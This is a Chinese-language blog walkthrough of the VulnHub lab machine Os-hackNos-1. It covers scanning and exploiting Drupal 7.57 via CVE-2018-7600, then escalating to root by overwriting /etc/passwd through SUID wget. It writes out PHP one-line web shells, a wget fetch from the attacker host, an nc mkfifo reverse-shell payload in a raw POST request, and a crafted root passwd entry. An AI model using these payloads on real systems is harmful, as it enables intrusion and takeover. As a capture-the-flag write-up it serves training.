---
title: Os-hackNos-1
date: 2023-10-19 18:10:06
tags:
---
# Os-hackNos-1

靶机下载 https://www.vulnhub.com/entry/hacknos-os-hacknos,401

目标为 普通用户的**user.txt**和root用户的**root.txt**

## 靶机配置

在将靶机文件下载下来为Os-hackNos-1.ova

使用vm打开这个ova文件进行导入。导入完成后，若是遇到无法获取ip地址，则需要在启动界面点击shift进入如下界面按下e

![image-20230628231828025](image-20230628231828025.png)



```
向下翻动，将ro改为rw single init=/bin/bash
```

![image-20230628231856200](image-20230628231856200.png)

然后按下 ctrl+x进入shell

使用ip a查看ip地址

若发现无ip地址，则记住网卡名称，这里是ens33

![image-20230628231909760](image-20230628231909760.png)

使用

```
vim /etc/network/interfaces
```

对网卡信息进行编辑

![image-20230628231926804](image-20230628231926804.png)

如果在使用vim /etc/network/interfaces没有如上信息，则需要重新导入ova，即删掉此虚拟机，重新使用vm打开ova并导入。

使用

```
/etc/init.d/networking restart
```

进行网卡重启

若是返回networking没找到此命令，证明ova导入时文件缺失，需要重新导入ova。



## 进行渗透

靶机和kali在同一个网段。

使用nmap对此网段进行扫描

nmap 192.168.5.0/24 -O 

其中靶机的信息如下 

Nmap scan report for 192.168.5.132
Host is up (0.00047s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:B0:11:06 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

其中80端口开启了



**则这里靶机ip地址为192.168.5.132**



故存在网页，则使用dirsearch进行目录扫描

![image-20230628231946258](image-20230628231946258.png)

发现http://192.168.5.132/drupal/并进行访问

![image-20230628232004225](image-20230628232004225.png)

通过 http://192.168.0.142/drupal/CHANGELOG.txt 得知grupal的版本为 Drupal 7.57

![image-20230628232023925](image-20230628232023925.png)

在百度等搜索引擎中搜索该版本的漏洞，找到CVE-2018-7600

![image-20230628232037744](image-20230628232037744.png)

在github中下载该漏洞的exp

https://github.com/pimps/CVE-2018-7600



git clone https://github.com/pimps/CVE-2018-7600.git

在kali中

```
./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c ls

或者
python3 drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c ls
```

即可执行ls读取文件

![image-20230628232052599](image-20230628232052599.png)



在当前目录写一个一句话木马

这里参考的moonsec的

moon.php

```
<?php system($_POST['moon']);?>
```

这里写自己的webshell

php.php

```
<?php @eval($_POST['qwer']);?>
```

后者可以通过菜刀之类的webshell工具进行连接

这里用哥斯拉进行连接

![image-20230628232108952](image-20230628232108952.png)

![image-20230628232130003](image-20230628232130003.png)



或者采用第一种(即moon的方式)进行反弹shell

然后在当前目录开启python自带的httpserver

python -m SimpleHTTPServer

然后使用

```
./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c "wget http://192.168.5.129:8000/moon.php"   
```

将php文件上传到靶机上

再使用

```
./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c ls
```

查看php木马是否上传成功

![image-20230628232146849](image-20230628232146849.png)





首先在kali中使用nc进行监听

nc -lvnp 9000

在浏览器中访问http://192.168.5.132/drupal/moon.php



使用burp进行抓包准备反弹shell

```
POST /drupal/moon.php HTTP/1.1

Host: 192.168.5.132

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.0 Safari/537.36 Edg/92.0.874.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Cookie: has_js=1

Upgrade-Insecure-Requests: 1

Content-Type: application/x-www-form-urlencoded

Content-Length: 91



moon=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash++2>%261|nc+192.168.5.129+9000+>/tmp/f
```



注意这里的 192.168.5.129为kali的ip地址

moon博客里写的是/bin/sh -i 但是我在测试时报错了

rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+‐i+2>%261|nc+192.168.0.136+9001+>/tmp/f



我这里改为 /bin/bash

moon=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash++2>%261|nc+192.168.5.129+9000+>/tmp/f





提交之后可以反弹一个shell

![image-20230628232204943](image-20230628232204943.png)

此时已经反弹成功

然后切换为python3的shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20230628232226022](image-20230628232226022.png)

在网站根目录发现一个**alexander.txt**

使用cat获取其内容

```
www-data@hackNos:/var/www/html/drupal$ cd ..
cd ..
www-data@hackNos:/var/www/html$ ls
ls
alexander.txt  drupal  index.html
www-data@hackNos:/var/www/html$ cat alexander.txt
cat alexander.txt
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==

```

凭借经验看出这是base64加密的数据，将其使用base64解密

![image-20230628232243956](image-20230628232243956.png)

然后发现左边是Brainfuck



![image-20230628232301143](image-20230628232301143.png)

解密网站如下

```
https://www.splitbrain.org/services/ook
```

![image-20230628232314924](image-20230628232314924.png)

点击右下角Brainfuck to text即可解密

得到james:hacker@4514



通过查找，在home中找到james和其目录下的user.txt

```
www-data@hackNos:/home/james$ cat user.txt
cat user.txt
   _                                  
  | |                                 
 / __) ______  _   _  ___   ___  _ __ 
 \__ \|______|| | | |/ __| / _ \| '__|
 (   /        | |_| |\__ \|  __/| |   
  |_|          \__,_||___/ \___||_|   
                                      
                                      

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

```

试着提权，先看看suid提权，需要搜索到，带有s的文件，开始查找。

```
find / -perm -u=s -type f 2>/dev/null
```

![image-20230628232332862](image-20230628232332862.png)

发现wget普通用户也可执行

那么提权的方式就是通过下载目标靶机上的passwd，然后构造一个有root权限的用户加入到构造的passwd文件中，然后使用wget -O将内容重定向输入到/etc/passwd中



首先通过cat /etc/passwd获取靶机密码

```
www-data@hackNos:/var/www/html/drupal$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
james:x:1000:1000:james,,,:/home/james:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
moon:$1$moon$8F2YI9c3zhkkS9SOsKawY0:0:0:root:/root:/bin/bash
```

复制到本地生成文件passwd

在kali中生成密码

![image-20230628232349133](image-20230628232349133.png)

将moon加入到伪造的passwd，并赋予root权限

![image-20230628232408828](image-20230628232408828.png)

将passwd放到开启了python  httpserver的文件夹中

然后使用

```
./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c "wget http://192.168.5.129:8000/passwd -O /etc/passwd"  
```

或者直接在已有的shell中进行

```
wget http://192.168.5.129:8000/passwd -O /etc/passwd
```

然后在已有的shell中进行切换用户

![image-20230628232454442](image-20230628232454442.png)



```

root@hackNos:/var/www# cd ~
cd ~
root@hackNos:~# ls
ls
root.txt
root@hackNos:~# cat root.txt
cat root.txt
    _  _                              _   
  _| || |_                           | |  
 |_  __  _|______  _ __  ___    ___  | |_ 
  _| || |_|______|| '__|/ _ \  / _ \ | __|
 |_  __  _|       | |  | (_) || (_) || |_ 
   |_||_|         |_|   \___/  \___/  \__|
                                          
                                          

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Linkedin : https://www.linkedin.com/in/rahulgehlaut/

Blog : www.hackNos.com

```





## 注意事项

使用菜刀等webshell不能切换，因为su命令必须在终端中执行

su: must be run from a terminal

![image-20230628232523339](image-20230628232523339.png)

